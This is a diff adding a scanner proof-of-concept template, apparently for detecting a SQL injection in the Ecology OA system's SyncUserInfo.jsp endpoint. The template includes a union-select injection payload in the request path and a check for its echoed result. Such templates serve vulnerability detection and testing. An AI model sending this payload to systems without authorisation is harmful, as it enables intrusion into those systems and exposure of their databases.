@@ -1,0 +1,23 @@
+id: poc-yaml-ecology-syncuserinfo-sqli
+info:
+  name: Ecology Syncuserinfo SQL注入漏洞
+  severity: medium
+  tags:
+  - sql-injection
+  finger: Ecology Syncuserinfo
+  reference: []
+  description: null
+variables:
+  r1: random_int(40000, 44800)
+  r2: random_int(40000, 44800)
+transport: http
+requests:
+- method: GET
+  path: /mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str({{.r1}}*{{.r2}}),null
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, r1 * r2)
+  output: []
